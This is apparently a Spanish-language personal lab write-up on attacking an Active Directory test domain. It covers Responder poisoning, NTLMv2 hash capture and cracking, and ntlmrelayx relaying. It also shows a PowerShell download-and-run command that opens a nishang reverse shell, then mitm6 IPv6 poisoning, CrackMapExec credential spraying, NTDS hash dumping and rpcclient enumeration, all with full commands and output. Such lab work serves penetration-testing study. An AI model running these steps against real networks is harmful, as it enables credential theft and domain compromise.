# Explotación Active Directory
---
- SMB No firmado --> Samba-Relay Enumeración de hashes.
- 
## SambaRelay Enumeración de hashes NTLM v2. 
El ataque SMB Relay **permite al atacante grabar la autenticación cuando el sistema automatizado intenta conectarse a su equipo**, lo que se graba es el hash SMB, que será reutilizado para establecer conexión con un equipo víctima.
### Responder.py
**Responder**.**py** , es una herramienta que  puede **responder** a las consultas LLMNR y NBT-NS dando su propia dirección IP como destino para cualquier nombre de host solicitado. Antes de usar, verificamos que el archivo `/usr/share/responder/Responder.conf`, y que todos los servicios estén habilitados.
``` java
──────────────────────────────────────────────────────────────────
File: Responder.conf
──────────────────────────────────────────────────────────────────
[Responder Core]
; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
──────────────────────────────────────────────────────────────────
```
#### Emitir Responder.py
Para lazan el responder, se debe utilizar con siguiente sentencia.
``` java
┌──(root㉿kali)-[/usr/share/responder]
└─# python3 Responder.py -I eth0 -dw 
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]
[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.200.147]
    Responder IPv6             [fe80::20c:29ff:fe34:f80f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']
[+] Current Session Variables:
    Responder Machine Name     [WIN-KDZSQ1EA7YF]
    Responder Domain Name      [HQZ3.LOCAL]
    Responder DCE-RPC Port     [45603]
[+] Listening for events...  
```
_*Nota.-*_ Esta vulnerabilidad puede ser explotada cuando el samba no esta firmado, por lo tanto, los clientes no reconocen la legitimidad del origen y responde a cualquier peticón que se encuentre en la red,  no importa si este recurso no existe, el cliente va aceptar la petición del servicio en escucha.
Para capturar el hash solo debemos acceder a un recurso, aunque este no exista, y la petición será capturada por responder.
![[AccederRecurso.png|500]]
#### Envenenamiento de Respuesta -  
Con la petición del cliente al recurso `RecursoCompartido` , vemos, que responder envenena la petición y captura el hashs.

``` java
[*] [LLMNR]  Poisoned answer sent to fe80::6837:af6b:7aa4:a0e5 for name RecursoCompartido
[*] [LLMNR]  Poisoned answer sent to 192.168.200.158 for name RecursoCompartido
[SMB] NTLMv2-SSP Client   : fe80::6837:af6b:7aa4:a0e5
[SMB] NTLMv2-SSP Username : LABSTIZONAL\uprod
[SMB] NTLMv2-SSP Hash     : uprod::LABSTIZONAL:4693ff68fdd96492:D212C25C41B0A4A4E24F59C22717B61B:0101000000000000809AC412D733D9015689EDA93E3B9CF80000000002000800480051005A00330001001E00570049004E002D004B0044005A005300510031004500410037005900460004003400570049004E002D004B0044005A00530051003100450041003700590046002E00480051005A0033002E004C004F00430041004C0003001400480051005A0033002E004C004F00430041004C0005001400480051005A0033002E004C004F00430041004C0007000800809AC412D733D90106000400020000000800300030000000000000000000000000200000C3DA49E9B229E0C5E082EA693B0B19EBA504BFDA47C5C7766AE46E0FEB68F7F30A0010000000000000000000000000000000000009002C0063006900660073002F005200650063007500720073006F0043006F006D007000610072007400690064006F000000000000000000   
[*] [MDNS] Poisoned answer sent to 192.168.200.158 for name RecursoCompartido.local
```
Capturando una petición de una usuario `Administrador`.
``` java
[*] [LLMNR]  Poisoned answer sent to 192.168.200.155 for name noexisten
[SMB] NTLMv2-SSP Client   : fe80::7de3:f19c:6df7:3126
[SMB] NTLMv2-SSP Username : LABSTIZONAL\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::LABSTIZONAL:6d127a291b2278ce:805988646F0A0F8B07BE232DD335A01A:0101000000000000809AC412D733D90185D5CE92C480498C0000000002000800480051005A00330001001E00570049004E002D004B0044005A005300510031004500410037005900460004003400570049004E002D004B0044005A00530051003100450041003700590046002E00480051005A0033002E004C004F00430041004C0003001400480051005A0033002E004C004F00430041004C0005001400480051005A0033002E004C004F00430041004C0007000800809AC412D733D9010600040002000000080030003000000000000000000000000030000073A49DC6C9DB37877416F3C12228859F043EF6AE3B6D16EE96233F071DD3B23E0A0010000000000000000000000000000000000009001C0063006900660073002F006E006F006500780069007300740065006E00000000000000000000000000                   
[*] [LLMNR]  Poisoned answer sent to fe80::7de3:f19c:6df7:3126 for name noexisten

```
Con lo hashes extraidos se puede hacer crack de hashes usando `john`.
``` java
┌──(s3cur1ty3c㉿kali)-[~/CTF/AD]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes                   
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (utest)     
P@ssw0rd         (Administrator)     
Password2        (uprod)     
3g 0:00:00:00 DONE (2023-01-29 12:53) 27.27g/s 521309p/s 633018c/s 633018C/s soydivina..YELLOW1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

## SambaRelay -  Volcado de hashes NTLMv2.
### NtlmRelay - Dumpeado de hashs.
Para ejecutar un volcado de hashes  NTLMv2 utilizando samba relay, tenemos considerar que conocemos o existen credenciales con privilegios, por lo que debemos ejecutar los siguientes pasos:
- para ejecutar este ataque debemos modificar el archivo `Responder.py`, cambiar los valores de los servicios SMB  y HTTP, el resde deben permanecer igual.

``` java
─────────────────────────────────
File: Responder.conf
─────────────────────────────────
[Responder Core]
; Servers to start
SMB = Off
HTTP = Off
```
- Creamos un archivo con el nombre del equipo que vamos atacar, en este caso `192.168.200.158`, al archivo lo nombraremos target.txt.
``` java
┌──(s3cur1ty3c㉿kali)-[~/CTF/AD]
└─$ cat target.txt 
───────┬─────────────────────────────────────────────
	   │ File: target.txt
───────┼─────────────────────────────────────────────
		| 192.168.200.158
───────┴─────────────────────────────────────────────
```
- Para ejecutar el volcado de los hashes NTLMv2 utilizamos `ntlmrelay.py`

``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# ntlmrelayx.py -tf target.txt -smb2support 
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
```
- La ejecución del responder.py es la misma que la vez anterior
``` java
python3 Responder.py -I eth0 -wd
```
Una que intentamos acceder a un recurso copartido mediante el servicio samba, podemo ver `ntlmrelay`, dumpea todos los hashes `ntlm`, y con eso podemos hacer path de hashes.
``` java
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:366f8baf4a2a26338a32c052599baf77:::
PC-Prod:1000:aad3b435b51404eeaad3b435b51404ee:9b51a448666fdfb2d0ec82f832ab8faf:::
```
### NtlmRelay - Execución de comandos.
`ntlmrelayx.py` es un script de Python que se utiliza para realizar ataques de relé NTLM en redes y sistemas. Se basa en la librería Impacket y permite a un atacante transferir una autenticación NTLM a otro servidor o sistema para obtener acceso no autorizado a los recursos protegidos por ese servidor o sistema
- Copiamos un executable tipo `ps1`, de la ruta `/usr/share/nishang/Shells`
``` java  
┌──(root㉿kali)-[/usr/share/nishang/Shells]
└─# cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /home/s3cur1ty3c/CTF/AD/ps.ps1
```
- Modificamos el script y al final del script agregamos esta linea.
``` java
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.200.147 -Port 4646
```
- Ponemos en escucha el responder.py es la misma que la vez anterior
``` java
python3 Responder.py -I eth0 -wd
```
- Ponemos en escucha una comuncaciòn de netcat.
```java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# rlwrap nc -nlvp 4646           
listening on [any] 4646 ...
```
- Compartimos el archivo ps.ps1, mediante un servidor web-python.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# ls
 192.168.200.158_samhashes.sam   hashes   ps.ps1   target.txt   vp
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# python3 -m http.server 8000              
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Una vez compartido el exploit por un servidor web, enviamos una petición con ntlmrelayx.py, para transferiri una autenticación ntlm, y hacer un ataque `path de hashes`, ejecutamos de la siguiente manera.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# ntlmrelayx.py -tf target.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.200.147:8000/ps.ps1')"
```
> *-tf* .- TargetFile, este flag permite indicar el objetivo para atacar `target.txt`
> *-smb2support*.- Este flag da soporte para smb version2.
> *-c*.- Este atributo sirve para enviar ejecución de comandos aprovechando que existen credenciales cuando hay vocado de hashes.

Cuando se ejecuta el ataque, se observar los intentos de autenticación, hastas que logra obteber un valor de `LABSTIZONAL\utest SUCCEED`
``` java
[-] Authenticating against smb://192.168.200.158 as LABSTIZONAL\utest FAILED
[*] HTTPD: Received connection from 192.168.200.156, attacking target smb://192.168.200.158
[*] HTTPD: Received connection from 192.168.200.156, attacking target smb://192.168.200.158
[*] Authenticating against smb://192.168.200.158 as LABSTIZONAL\utest SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Authenticating against smb://192.168.200.158 as LABSTIZONAL\utest SUCCEED
[*] SMBD-Thread-22: Received connection from 192.168.200.156, attacking target smb://192.168.200.158
[-] Authenticating against smb://192.168.200.158 as LABSTIZONAL\utest FAILED
[*] Executed specified command on host: 192.168.200.158
[-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
Una vez ejecuta el envenenamiento de smb, al momento de acceder a un recurso que no existe, este generar la shell reversa al servicio de `nc` que pusimos en escucha, cabe recalcar que esto se aprovecha que el servicio smb no esta firmado.

``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# rlwrap nc -nlvp 4646
listening on [any] 4646 ...
connect to [192.168.200.147] from (UNKNOWN) [192.168.200.158] 49790
Windows PowerShell running as user PC-PROD$ on PC-PROD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

### NtlmRelay - Envenenando por IPV6.
#### mitm6
`mitm6` es una herramienta que se utiliza para realizar ataques de interceptación de red en redes IPv6. Es una versión de la herramienta `mitm` (Man-in-the-Middle, o Hombre en el Medio en español), que se utiliza para realizar ataques similares en redes IPv4. La herramienta `mitm6` permite a un atacante interceptar y manipular el tráfico de red en una red IPv6, lo que puede permitirle acceder a información confidencial, manipular el tráfico para inyectar malware o reenrutar el tráfico para lograr objetivos malintencionados. 
``` java
┌──(root㉿kali)-[/usr/share/responder]
└─# mitm6 -d labstizonal.local
:0: UserWarning: You do not have a working installation of the service_identity module: 'No module named service_identity'.  Please install it from <https://pypi.python.org/pypi/service_identity> and make sure all of its dependencies are satisfied.  Without the service_identity module, Twisted can perform only rudimentary TLS client hostname verification.  Many valid certificate/hostname mappings may be rejected.
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:34:f8:0f]
IPv4 address: 192.168.200.147
IPv6 address: fe80::20c:29ff:fe34:f80f
DNS local search domain: labstizonal.local
DNS allowlist: labstizonal.local
```
En la ejecución hacemos envenenamiento de ipv6, por lo que los equipos clientes asumen que existen un servidor dns por ipv6, por lo tanto ellos responderan las peticiones.
``` java
C:\Users\utest>ipconfig /all

Configuración IP de Windows
   Nombre de host. . . . . . . . . : pc-test
   Sufijo DNS principal  . . . . . : labstizonal.local
   Tipo de nodo. . . . . . . . . . : híbrido
   Enrutamiento IP habilitado. . . : no
   Proxy WINS habilitado . . . . . : no
   Lista de búsqueda de sufijos DNS: labstizonal.local
                                       labstizona.local
Adaptador de Ethernet Ethernet0:

   Sufijo DNS específico para la conexión. . : localdomain
   Descripción . . . . . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Dirección física. . . . . . . . . . . . . : 00-0C-29-B2-AC-87
   DHCP habilitado . . . . . . . . . . . . . : sí
   Configuración automática habilitada . . . : sí
   Vínculo: dirección IPv6 local. . . : fe80::1381:1%11(Preferido)
   Concesión obtenida. . . . . . . . . . . . : lunes, 30 de enero de 2023 10:09:10 p. m.
   La concesión expira . . . . . . . . . . . : lunes, 30 de enero de 2023 10:14:10 p. m.
   Vínculo: dirección IPv6 local. . . : fe80::8d83:1849:9164:b7a2%11(Preferido)
   Dirección IPv4. . . . . . . . . . . . . . : 192.168.200.156(Preferido)
   Máscara de subred . . . . . . . . . . . . : 255.255.255.0
   Concesión obtenida. . . . . . . . . . . . : lunes, 30 de enero de 2023 08:37:03 p. m.
   La concesión expira . . . . . . . . . . . : lunes, 30 de enero de 2023 10:36:25 p. m.
   Puerta de enlace predeterminada . . . . . : 192.168.200.2
   Servidor DHCP . . . . . . . . . . . . . . : 192.168.200.254
   IAID DHCPv6 . . . . . . . . . . . . . . . : 100666409
   DUID de cliente DHCPv6. . . . . . . . . . : 00-01-00-01-2B-66-8E-16-00-0C-29-B2-AC-87
   Servidores DNS. . . . . . . . . . . . . . : fe80::20c:29ff:fe34:f80f%11
                                       192.168.200.155
                                       1.1.1.1
   Servidor WINS principal . . . . . . . . . : 192.168.200.2
   NetBIOS sobre TCP/IP. . . . . . . . . . . : habilitado
   Lista de búsqueda de sufijos DNS específicos de conexión:
                                       labstizona.local
```
En la sección `Servidores DNS... : fe80::20c:29ff:fe34:f80f%11` podemos ver que s la misma dirección que ha generado la 
herramienta `mimt6`. Una vez ejecutada la fase de envenenamiento por ipv6, ejecutamos la intercepción `ntlmrelayx.py`.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# ntlmrelayx.py -wh 192.168.200.147 -t smd://192.168.200.158 -socks -debug -smb2support           
```
> *-wh.-* Permite especificar la ip del equipo que va actuar como intermediario o proxie `atacante 192.168.200.147`.
> *-t.-* Flag para establecer el target u objetivo en este caso por el servicio smb `smd://192.168.200.158`.
> *-socks.-* Para especificar un servidor proxy SOCKS para utilizar durante la ejecución de la herramienta.
> *-debug.-* Permite imprimirá información detallada sobre su ejecución, incluyendo información sobre las solicitudes que recibe y las respuestas que envía.

Una vez desplegaca la intercepción crea un sesion interactiva.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# ntlmrelayx.py -wh 192.168.200.147 -t smd://192.168.200.158 -socks -debug -smb2support                                                       
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening at port 1080
[*] SMTP Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] SMB Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>  * Serving Flask app "impacket.examples.ntlmrelayx.servers.socksserver" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
ntlmrelayx> 
```
Seguir intentando hasta que salga

ntlmrelayx> socks
[*] No Relays Available!
ntlmrelayx> 


## Enumeración con Herramientas
### Reconocimiento de equipos por SMB
### CrackMapExec
que es una herramienta de post-explotación. Está escrita en python, y permite hacer movimientos laterales en una red. Esta herramienta permite enumerar los equipos en la red mediante smb.
```java

┌──(root㉿kali)-[/usr/share/responder]
└─# crackmapexec smb 192.168.200.0/24 
SMB         192.168.200.1   445    LPDEV            [*] Windows 10.0 Build 22621 x64 (name:LPDEV) (domain:lpdev) (signing:False) (SMBv1:False)
SMB         192.168.200.155 445    DC-TIZONAL       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-TIZONAL) (domain:labstizonal.local) (signing:True) (SMBv1:True)
SMB         192.168.200.156 445    PC-TEST          [*] Windows 10.0 Build 19041 x64 (name:PC-TEST) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.158 445    PC-PROD          [*] Windows 10.0 Build 19041 x64 (name:PC-PROD) (domain:labstizonal.local) (signing:False) (SMBv1:False)
```
Cuando existen malas configuraciones, podemos buscar equipos en la red especificando credenciales y verificar si hay acceso, al otener una respuesta `Pwn3d`, confirmar que si hay acceso al equipo.
``` java
┌──(root㉿kali)-[/usr/share/responder]
└─# crackmapexec smb 192.168.200.0/24 -u 'utest' -p 'Password1'
SMB         192.168.200.1   445    LPDEV            [*] Windows 10.0 Build 22621 x64 (name:LPDEV) (domain:lpdev) (signing:False) (SMBv1:False)
SMB         192.168.200.1   445    LPDEV            [-] lpdev\utest:Password1 STATUS_LOGON_FAILURE 
SMB         192.168.200.155 445    DC-TIZONAL       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-TIZONAL) (domain:labstizonal.local) (signing:True) (SMBv1:True)
SMB         192.168.200.158 445    PC-PROD          [*] Windows 10.0 Build 19041 x64 (name:PC-PROD) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.156 445    PC-TEST          [*] Windows 10.0 Build 19041 x64 (name:PC-TEST) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.155 445    DC-TIZONAL       [+] labstizonal.local\utest:Password1 
SMB         192.168.200.158 445    PC-PROD          [+] labstizonal.local\utest:Password1 (Pwn3d!)
SMB         192.168.200.156 445    PC-TEST          [+] labstizonal.local\utest:Password1 
```
Cuando se conoce las credenciales del usuario administrador del dominio se puede volcar la memoria SAM de todos los equipos
``` java
┌──(root㉿kali)-[/usr/share/responder]
└─# crackmapexec smb 192.168.200.0/24 -u 'administrator' -p 'P@ssw0rd'
SMB         192.168.200.1   445    LPDEV            [*] Windows 10.0 Build 22621 x64 (name:LPDEV) (domain:lpdev) (signing:False) (SMBv1:False)
SMB         192.168.200.1   445    LPDEV            [-] lpdev\administrator:P@ssw0rd STATUS_LOGON_FAILURE 
SMB         192.168.200.155 445    DC-TIZONAL       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-TIZONAL) (domain:labstizonal.local) (signing:True) (SMBv1:True)
SMB         192.168.200.158 445    PC-PROD          [*] Windows 10.0 Build 19041 x64 (name:PC-PROD) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.155 445    DC-TIZONAL       [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.200.156 445    PC-TEST          [*] Windows 10.0 Build 19041 x64 (name:PC-TEST) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.158 445    PC-PROD          [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.200.156 445    PC-TEST          [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
```
#### Habiliar servicios en todos los equipos
``` java
┌──(root㉿kali)-[/usr/share/responder]
└─# crackmapexec smb 192.168.200.0/24 -u 'administrator' -p 'P@ssw0rd' -M rdp -o action=enable
SMB         192.168.200.1   445    LPDEV            [*] Windows 10.0 Build 22621 x64 (name:LPDEV) (domain:lpdev) (signing:False) (SMBv1:False)
SMB         192.168.200.1   445    LPDEV            [-] lpdev\administrator:P@ssw0rd STATUS_LOGON_FAILURE 
SMB         192.168.200.155 445    DC-TIZONAL       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-TIZONAL) (domain:labstizonal.local) (signing:True) (SMBv1:True)
SMB         192.168.200.156 445    PC-TEST          [*] Windows 10.0 Build 19041 x64 (name:PC-TEST) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.158 445    PC-PROD          [*] Windows 10.0 Build 19041 x64 (name:PC-PROD) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.155 445    DC-TIZONAL       [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.200.156 445    PC-TEST          [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.200.158 445    PC-PROD          [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
RDP         192.168.200.155 445    DC-TIZONAL       [+] RDP enabled successfully
RDP         192.168.200.156 445    PC-TEST          [+] RDP enabled successfully
RDP         192.168.200.158 445    PC-PROD          [+] RDP enabled successfully
```

#### Dumpear hashes ndts 
son hashes de contraseñas que se almacenan en el directorio activo (Active Directory) de un sistema Windows. Estos hashes se usan para autenticar a los usuarios y aplicaciones que acceden a recursos en el dominio.
``` java


   
┌──(root㉿kali)-[/usr/share/responder]
┌──(root㉿kali)-[/usr/share/responder]
└─# crackmapexec smb 192.168.200.0/24 -u 'administrator' -p 'P@ssw0rd' --ntds vss             
SMB         192.168.200.1   445    LPDEV            [*] Windows 10.0 Build 22621 x64 (name:LPDEV) (domain:lpdev) (signing:False) (SMBv1:False)
SMB         192.168.200.1   445    LPDEV            [-] lpdev\administrator:P@ssw0rd STATUS_LOGON_FAILURE 
SMB         192.168.200.156 445    PC-TEST          [*] Windows 10.0 Build 19041 x64 (name:PC-TEST) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.158 445    PC-PROD          [*] Windows 10.0 Build 19041 x64 (name:PC-PROD) (domain:labstizonal.local) (signing:False) (SMBv1:False)
SMB         192.168.200.155 445    DC-TIZONAL       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-TIZONAL) (domain:labstizonal.local) (signing:True) (SMBv1:True)
SMB         192.168.200.156 445    PC-TEST          [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.200.158 445    PC-PROD          [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.200.155 445    DC-TIZONAL       [+] labstizonal.local\administrator:P@ssw0rd (Pwn3d!)
SMB         192.168.200.155 445    DC-TIZONAL       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.200.155 445    DC-TIZONAL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         192.168.200.155 445    DC-TIZONAL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.200.155 445    DC-TIZONAL       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.200.155 445    DC-TIZONAL       DC-TIZONAL$:1000:aad3b435b51404eeaad3b435b51404ee:8d5ed9b8ce3e2f7086d352de70cceafd:::
SMB         192.168.200.155 445    DC-TIZONAL       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:507823cf6c1ca8ea1b5c72b4739a889a:::
SMB         192.168.200.155 445    DC-TIZONAL       labstizonal.local\utest:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.200.155 445    DC-TIZONAL       labstizonal.local\uprod:1105:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         192.168.200.155 445    DC-TIZONAL       PC-TEST$:1106:aad3b435b51404eeaad3b435b51404ee:59ca953f73b288fb401dc641c40ecd63:::
SMB         192.168.200.155 445    DC-TIZONAL       PC-PROD$:1107:aad3b435b51404eeaad3b435b51404ee:ab66aa8c271c5267119441c2d6e38d01:::
SMB         192.168.200.155 445    DC-TIZONAL       [+] Dumped 9 NTDS hashes to /root/.cme/logs/DC-TIZONAL_192.168.200.155_2023-01-31_003139.ntds of which 6 were added to the database
```


### rpcclient
es una herramienta de línea de comandos utilizada en sistemas operativos Windows que permite a un usuario interactuar con servidores de protocolo de control de cálculo remoto (RPC, por sus siglas en inglés). Con rpcclient, un usuario puede realizar tareas como ejecutar comandos en un servidor remoto, acceder a registros remotos y manipular archivos en un servidor remoto. Cuando se conoce las credenciales de un usuario se puede extraer los usuarios del AD, aunque este no tenga privilegios
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# rpcclient -U "labstizonal.local\utest%Password1" 192.168.200.155 -c 'enumdomusers'
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[utest] rid:[0x450]
user:[uprod] rid:[0x451]
user:[udev] rid:[0x454]
```
Con expresiones regualres se puede extraer data mas espeficica,  al punto de extaer solo los RID
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# rpcclient -U "labstizonal.local\utest%Password1" 192.168.200.155 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'
0x1f4
0x1f5
0x1f6
0x1f7
0x450
0x451
0x454
```
Cuando existe malas practicas de configuraciones se puede aprovechar la información que existe dentro de los usuarios

``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# for rid in $(rpcclient -U "labstizonal.local\utest%Password1" 192.168.200.155 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo "\n [+] El RID tiene: $rid \n"; rpcclient -U "labstizonal.local\utest%Password1" 192.168.200.155 -c "queryuser $rid" | grep -E -i "user name|description" ;done 

 [+] El RID tiene: 0x1f4 

        User Name   :   Administrator
        Description :   Built-in account for administering the computer/domain

 [+] El RID tiene: 0x1f5 

        User Name   :   Guest
        Description :   Built-in account for guest access to the computer/domain

 [+] El RID tiene: 0x1f6 

        User Name   :   krbtgt
        Description :   Key Distribution Center Service Account

 [+] El RID tiene: 0x1f7 

        User Name   :   DefaultAccount
        Description :   A user account managed by the system.

 [+] El RID tiene: 0x450 

        User Name   :   utest
        Description :

 [+] El RID tiene: 0x451 

        User Name   :   uprod
        Description :

 [+] El RID tiene: 0x454 

        User Name   :   udev
        Description :   Mypassword temporal: P@ssw0rd123
```

Usando rpclient, se puede hacer una enumeración especifica de usuarios administradore, por lo que, primero debemos loguearnos con usuario, no importa si tiene o no privilegios.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# rpcclient -U "

%Password1" 192.168.200.155
rpcclient $> 
```
Una vez logueado por `rpc`, listamos los grupos del AD, con el comando `enumdomgroups`, en esto apareceran todos los usuarios existentes.
``` java
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
```
Con los grupo extraidos podemos listar todos los usuarios mienbros de un grupo asociados al RIP `0x200`

``` java
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
        rid:[0x454] attr:[0x7]
        rid:[0x455] attr:[0x7]
```
Y con los RIP, de los usuarios se pueden listar toda la información del usuario. `queryuser 0x455`
``` java
rpcclient $> queryuser 0x455
        User Name   :   svc_sqlservice
        Full Name   :   SVC_SQLservice
